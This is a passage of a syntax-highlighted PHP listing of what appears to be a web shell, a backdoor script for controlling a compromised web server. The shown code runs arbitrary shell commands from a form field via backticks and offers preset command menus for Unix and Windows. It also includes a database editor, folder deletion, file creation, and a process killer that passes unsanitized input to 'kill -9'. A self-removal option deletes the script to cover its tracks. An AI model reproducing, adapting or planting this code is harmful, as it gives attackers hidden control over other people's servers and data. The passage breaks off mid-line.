<span class="lineno"> 802</span> <span class="s2">&lt;input type=hidden name=delete_row value=&#39;</span><span class="si">$buffer1</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 803</span> <span class="s2">&lt;input type=submit value=Del onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE ?</span><span class="se">\&quot;</span><span class="s2">)&#39; style=&#39;border:1px; background-color:white;&#39;&gt;</span>
<span class="lineno"> 804</span> <span class="s2">&lt;/form&gt;&lt;form method=post action=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$tbl</span><span class="s2">&amp;baza=1&amp;vn=</span><span class="si">$vn</span><span class="s2">&amp;db=</span><span class="si">$db</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 805</span> <span class="s2">&lt;input type=hidden name=edit_row value=&#39;</span><span class="si">$buffer1</span><span class="s2">&#39;&gt;</span>
<span class="lineno"> 806</span> <span class="s2">&lt;input type=submit value=Edit style=&#39;border:1px;background-color:green;&#39;&gt;</span>
<span class="lineno"> 807</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno"> 808</span> <span class="s2">&lt;/td&gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 809</span> <span class="k">print</span> <span class="nv">$b1</span><span class="p">;</span>
<span class="lineno"> 810</span> <span class="k">print</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 811</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$b1</span><span class="p">);</span>
<span class="lineno"> 812</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$buffer1</span><span class="p">);</span>
<span class="lineno"> 813</span> <span class="p">}</span>
<span class="lineno"> 814</span> 
<span class="lineno"> 815</span> 
<span class="lineno"> 816</span> 
<span class="lineno"> 817</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 818</span> <span class="k">print</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 819</span> <span class="p">}</span> <span class="c1">#end vnutr</span>
<span class="lineno"> 820</span> <span class="k">print</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 821</span> <span class="p">}</span> <span class="c1"># end $conn</span>
<span class="lineno"> 822</span> 
<span class="lineno"> 823</span> 
<span class="lineno"> 824</span> 
<span class="lineno"> 825</span> <span class="c1">####   end of sql</span>
<span class="lineno"> 826</span> <span class="k">print</span> <span class="s2">&quot;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 827</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 828</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno"> 829</span> <span class="p">}</span>
<span class="lineno"> 830</span> 
<span class="lineno"> 831</span> 
<span class="lineno"> 832</span> <span class="o">@</span><span class="nv">$p</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
<span class="lineno"> 833</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;selfremover&quot;</span><span class="p">){</span>
<span class="lineno"> 834</span>         <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 835</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=red face=verdana size=1&gt;Are you sure?&lt;br&gt;</span>
<span class="lineno"> 836</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=yes&#39;&gt;Yes&lt;/a&gt; | &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?&#39;&gt;No&lt;/a&gt;&lt;br&gt;</span>
<span class="lineno"> 837</span> <span class="s2">Remove: &lt;u&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 838</span> <span class="nv">$path</span><span class="o">=</span><span class="k">__FILE__</span><span class="p">;</span>
<span class="lineno"> 839</span> <span class="k">print</span> <span class="nv">$path</span><span class="p">;</span>
<span class="lineno"> 840</span> <span class="k">print</span> <span class="s2">&quot; &lt;/u&gt;?&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 841</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno"> 842</span> <span class="p">}</span>
<span class="lineno"> 843</span> 
<span class="lineno"> 844</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="lineno"> 845</span> <span class="nv">$path</span><span class="o">=</span><span class="k">__FILE__</span><span class="p">;</span>
<span class="lineno"> 846</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 847</span> <span class="nv">$path</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
<span class="lineno"> 848</span> <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">)){</span><span class="nv">$hmm</span><span class="o">=</span><span class="s2">&quot;NOT DELETED!!!&quot;</span><span class="p">;</span>
<span class="lineno"> 849</span> <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;font color=red&gt;FILE </span><span class="si">$path</span><span class="s2"> NOT DELETED&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 850</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="nv">$hmm</span><span class="o">=</span><span class="s2">&quot;DELETED&quot;</span><span class="p">;}</span>
<span class="lineno"> 851</span> <span class="k">print</span> <span class="s2">&quot;&lt;script&gt;alert(&#39;</span><span class="si">$path</span><span class="s2"> </span><span class="si">$hmm</span><span class="s2">&#39;);&lt;/script&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 852</span> 
<span class="lineno"> 853</span> <span class="p">}</span>
<span class="lineno"> 854</span> 
<span class="lineno"> 855</span> 
<span class="lineno"> 856</span> 
<span class="lineno"> 857</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="lineno"> 858</span> <span class="k">function</span> <span class="nf">fastcmd</span><span class="p">(){</span>
<span class="lineno"> 859</span> <span class="k">global</span> <span class="nv">$fast_commands</span><span class="p">;</span>
<span class="lineno"> 860</span> <span class="nv">$c_f</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands</span><span class="p">);</span>
<span class="lineno"> 861</span> <span class="nv">$c_f</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$c_f</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">;</span>
<span class="lineno"> 862</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno"> 863</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno"> 864</span> <span class="s2">Total commands: </span><span class="si">$c_f</span><span class="s2">&lt;br&gt;</span>
<span class="lineno"> 865</span> <span class="s2">&lt;select name=sh3&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 866</span> 
<span class="lineno"> 867</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$fast_commands</span><span class="p">,</span><span class="s2">&quot; (nst) &quot;</span><span class="p">);</span>
<span class="lineno"> 868</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;=</span><span class="nv">$c</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 869</span>        <span class="nv">$expl2</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands</span><span class="p">);</span>
<span class="lineno"> 870</span>         <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; (nst) &quot;</span><span class="p">,</span><span class="nv">$expl2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno"> 871</span>         <span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">){</span>
<span class="lineno"> 872</span>         <span class="k">print</span> <span class="s2">&quot;&lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;</span><span class="si">$expl[0]</span><span class="s2">&lt;/option&gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 873</span>    <span class="p">}</span>
<span class="lineno"> 874</span> <span class="p">}</span>
<span class="lineno"> 875</span> 
<span class="lineno"> 876</span> <span class="k">print</span> <span class="s2">&quot;&lt;/select&gt;&lt;br&gt;</span>
<span class="lineno"> 877</span> <span class="s2">&lt;input type=submit value=Exec&gt;</span>
<span class="lineno"> 878</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno"> 879</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 880</span> <span class="p">}</span>
<span class="lineno"> 881</span> <span class="p">}</span><span class="c1">#end of os unix</span>
<span class="lineno"> 882</span> 
<span class="lineno"> 883</span> 
<span class="lineno"> 884</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span>
<span class="lineno"> 885</span> <span class="k">function</span> <span class="nf">fastcmd</span><span class="p">(){</span>
<span class="lineno"> 886</span> <span class="k">global</span> <span class="nv">$fast_commands_win</span><span class="p">;</span>
<span class="lineno"> 887</span> <span class="nv">$c_f</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands_win</span><span class="p">);</span>
<span class="lineno"> 888</span> <span class="nv">$c_f</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$c_f</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">;</span>
<span class="lineno"> 889</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno"> 890</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno"> 891</span> <span class="s2">Total commands: </span><span class="si">$c_f</span><span class="s2">&lt;br&gt;</span>
<span class="lineno"> 892</span> <span class="s2">&lt;select name=sh3&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 893</span> 
<span class="lineno"> 894</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$fast_commands_win</span><span class="p">,</span><span class="s2">&quot; (nst) &quot;</span><span class="p">);</span>
<span class="lineno"> 895</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;=</span><span class="nv">$c</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 896</span>        <span class="nv">$expl2</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands_win</span><span class="p">);</span>
<span class="lineno"> 897</span>         <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; (nst) &quot;</span><span class="p">,</span><span class="nv">$expl2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno"> 898</span>         <span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">){</span>
<span class="lineno"> 899</span>         <span class="k">print</span> <span class="s2">&quot;&lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;</span><span class="si">$expl[0]</span><span class="s2">&lt;/option&gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 900</span>    <span class="p">}</span>
<span class="lineno"> 901</span> <span class="p">}</span>
<span class="lineno"> 902</span> 
<span class="lineno"> 903</span> <span class="k">print</span> <span class="s2">&quot;&lt;/select&gt;&lt;br&gt;</span>
<span class="lineno"> 904</span> <span class="s2">&lt;input type=submit value=Exec&gt;</span>
<span class="lineno"> 905</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno"> 906</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 907</span> <span class="p">}</span>
<span class="lineno"> 908</span> <span class="p">}</span><span class="c1">#end of os win</span>
<span class="lineno"> 909</span> 
<span class="lineno"> 910</span> 
<span class="lineno"> 911</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 912</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 913</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sh311&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;cmd&lt;br&gt;pwd:</span>
<span class="lineno"> 914</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 915</span> <span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 916</span> <span class="k">echo</span> <span class="nb">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno"> 917</span> <span class="s2">Fast cmd:&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 918</span> <span class="nx">fastcmd</span><span class="p">();</span>
<span class="lineno"> 919</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span><span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);}</span>
<span class="lineno"> 920</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno"> 921</span> <span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:cwd(&#39;</span><span class="si">$d</span><span class="s2"> &#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;Insert pwd&lt;/a&gt;</span>
<span class="lineno"> 922</span> <span class="s2">&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;</span>
<span class="lineno"> 923</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 924</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">]){</span>
<span class="lineno"> 925</span> <span class="nv">$sh3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">];</span>
<span class="lineno"> 926</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 927</span> <span class="k">print</span> <span class="sb">`$sh3`</span><span class="p">;</span>
<span class="lineno"> 928</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 929</span> <span class="p">}</span>
<span class="lineno"> 930</span> <span class="p">}</span>
<span class="lineno"> 931</span> 
<span class="lineno"> 932</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sh311&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;2&quot;</span><span class="p">){</span>
<span class="lineno"> 933</span> <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;cmd&lt;br&gt;</span>
<span class="lineno"> 934</span> <span class="s2">pwd:</span>
<span class="lineno"> 935</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 936</span> <span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 937</span> <span class="k">echo</span> <span class="nb">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno"> 938</span> <span class="s2">Fast cmd:&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 939</span> <span class="nx">fastcmd</span><span class="p">();</span>
<span class="lineno"> 940</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span><span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);}</span>
<span class="lineno"> 941</span> <span class="k">print</span> <span class="s2">&quot;</span>
<span class="lineno"> 942</span> <span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:cwd(&#39;</span><span class="si">$d</span><span class="s2"> &#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;Insert pwd&lt;/a&gt;</span>
<span class="lineno"> 943</span> <span class="s2">&lt;form name=sh311Form method=post&gt;&lt;input name=sh3 size=110&gt;&lt;/form&gt;&lt;/center&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 944</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">]){</span>
<span class="lineno"> 945</span> <span class="nv">$sh3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">];</span>
<span class="lineno"> 946</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="k">print</span> <span class="sb">`$sh3`</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 947</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 948</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno"> 949</span> 
<span class="lineno"> 950</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfl&#39;</span><span class="p">]){</span>
<span class="lineno"> 951</span> <span class="o">@</span><span class="nv">$delfolder</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfolder&#39;</span><span class="p">];</span>
<span class="lineno"> 952</span> <span class="k">echo</span> <span class="s2">&quot;DELETE FOLDER: &lt;font color=red&gt;&quot;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfolder&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&lt;br&gt;</span>
<span class="lineno"> 953</span> <span class="s2">(All files must be writable)&lt;br&gt;</span>
<span class="lineno"> 954</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?deldir=1&amp;dir=&quot;</span><span class="o">.@</span><span class="nv">$delfolder</span><span class="o">.</span><span class="s2">&quot;&amp;rback=&quot;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rback&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;Yes&lt;/a&gt; || &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&gt;No&lt;/a&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno"> 955</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 956</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 957</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 958</span> <span class="p">}</span>
<span class="lineno"> 959</span> 
<span class="lineno"> 960</span> 
<span class="lineno"> 961</span> <span class="nv">$mkdir</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mkdir&#39;</span><span class="p">];</span>
<span class="lineno"> 962</span> <span class="k">if</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">){</span>
<span class="lineno"> 963</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;Create Folder in </span><span class="si">$d</span><span class="s2"> :&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno"> 964</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno"> 965</span> <span class="s2">New folder name:&lt;br&gt;</span>
<span class="lineno"> 966</span> <span class="s2">&lt;input name=dir_n size=30&gt;</span>
<span class="lineno"> 967</span> <span class="s2">&lt;/form&gt;&lt;br&gt;</span>
<span class="lineno"> 968</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 969</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">]){</span>
<span class="lineno"> 970</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Cannot create directory &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">]);</span>
<span class="lineno"> 971</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&lt;font color=green&gt;Directory created success!&lt;/font&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 972</span> <span class="p">}</span>
<span class="lineno"> 973</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 974</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno"> 975</span> <span class="p">}</span>
<span class="lineno"> 976</span> 
<span class="lineno"> 977</span> 
<span class="lineno"> 978</span> <span class="nv">$mkfile</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mkfile&#39;</span><span class="p">];</span>
<span class="lineno"> 979</span> <span class="k">if</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">){</span>
<span class="lineno"> 980</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;Create file in </span><span class="si">$d</span><span class="s2"> :&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno"> 981</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno"> 982</span> <span class="s2">File name:&lt;br&gt;</span>
<span class="lineno"> 983</span> <span class="s2">(example: hello.txt , hello.php)&lt;br&gt;</span>
<span class="lineno"> 984</span> <span class="s2">&lt;input name=file_n size=30&gt;</span>
<span class="lineno"> 985</span> <span class="s2">&lt;/form&gt;&lt;br&gt;</span>
<span class="lineno"> 986</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 987</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">]){</span>
<span class="lineno"> 988</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">],</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Cannot create file &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">]);</span>
<span class="lineno"> 989</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="lineno"> 990</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&lt;font color=green&gt;File created success!&lt;/font&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 991</span> <span class="p">}</span>
<span class="lineno"> 992</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 993</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno"> 994</span> <span class="p">}</span>
<span class="lineno"> 995</span> 
<span class="lineno"> 996</span> 
<span class="lineno"> 997</span> <span class="nv">$ps_table</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ps_table&#39;</span><span class="p">];</span>
<span class="lineno"> 998</span> <span class="k">if</span><span class="p">(</span><span class="nv">$ps_table</span><span class="p">){</span>
<span class="lineno"> 999</span> 
<span class="lineno">1000</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;kill_p&#39;</span><span class="p">]){</span>
<span class="lineno">1001</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;kill -9 &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;kill_p&#39;</span><span class="p">]);</span>
<span class="lineno">1002</span> <span class="p">}</span>
<span class="lineno">1003</span> 
<span class="lineno">1004</span> <span class="nv">$str</span><span class="o">=</span><span class="sb">`ps aux`</span><span class="p">;</span>
<span class="lineno">1005</span> 
<span class="lineno">1006</span> <span class="c1"># You can put here preg_match_all for other distrib/os</span>
<span class="lineno">1007</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i&quot;</span><span class="p">,</span><span class="nv">$str</span><span class="p">,</span><span class="nv">$matches</span><span class="p">);</span>
<span class="lineno">1008</span> 
<span class="lineno">1009</span> 
<span class="lineno">1010</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;PS Table :: Fast kill program&lt;br&gt;</span>
<span class="lineno">1011</span> <span class="s2">(p.s: Tested on Linux slackware 10.0)&lt;br&gt;</span>
<span class="lineno">1012</span> <span class="s2">&lt;br&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1013</span> <span class="k">print</span> <span class="s2">&quot;&lt;center&gt;&lt;table border=1&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1014</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">1015</span> <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">1016</span> <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;</span><span class="si">$expl[0]</span><span class="s2">&lt;/td&gt;&lt;td&gt;PID: &quot;</span><span class="o">.</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; :: &quot;</span><span class="o">.</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;Kill: &lt;input type=submit name=kill_p value=&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span 